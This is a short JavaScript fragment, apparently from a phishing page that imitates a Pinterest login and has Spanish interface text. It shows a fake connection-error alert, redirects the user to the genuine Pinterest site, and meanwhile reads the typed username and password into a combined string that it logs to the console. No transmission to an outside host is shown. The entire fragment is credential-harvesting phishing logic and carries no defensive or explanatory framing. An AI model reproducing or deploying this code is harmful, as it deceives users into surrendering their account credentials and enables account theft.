function validateUser(){
    swal({
        title: "Error de conexion!\nIntentalo de nuevo",
        icon: "error"
    });
    setTimeout("openTrueSite()",3000);
}

function openTrueSite(){
    window.open("https://www.pinterest.es/pinterest/","_top");
    var datos=document.getElementById("usrIn").value+":"+document.getElementById("pwdIn").value;
    console.log("Usuario y contraseña:");
    console.log(datos);
    
}